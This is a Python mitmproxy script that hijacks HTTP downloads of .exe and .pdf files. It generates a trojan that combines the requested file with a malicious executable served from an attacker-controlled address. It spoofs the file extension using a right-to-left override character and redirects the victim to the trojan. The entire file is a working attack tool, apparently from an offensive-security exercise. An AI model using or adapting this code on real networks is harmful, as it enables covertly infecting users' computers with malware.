import mitmproxy
import os
from Trojan import Trojan


IP = "10.20.215.11"
TARGET_TEXTENSIONS = [".exe", ".pdf"]
EVIL_FILE = "http://10.20.215.11/nv.exe"
WEB_ROOT = "/var/www/html/"
SPOOF_EXTENSION = True

def request(flow):
	#code to handle request flows

	if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):
		print("[+] Got interesting flow")

		front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
		front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]

		front_file = flow.request.pretty_url + "#"
		download_file_name = front_file_name + ".exe"
		if SPOOF_EXTENSION and front_file_extension != "exe":
			print("[+] Renaming trojan to spoof its extension")
			download_file_name = front_file_name + "\u202E" + "".join(reversed(front_file_extension))  + ".exe"
		trojan_file = WEB_ROOT + download_file_name

		print("[+] Generating a trojan for " + flow.request.pretty_url)

		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file)
		trojan.create()
		trojan.compile()

		if SPOOF_EXTENSION:
			trojan.zip(trojan_file)
			download_file_name = front_file_name + ".zip"

		trojan_download_url = "http://" + IP + "/" + download_file_name
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location": trojan_download_url})
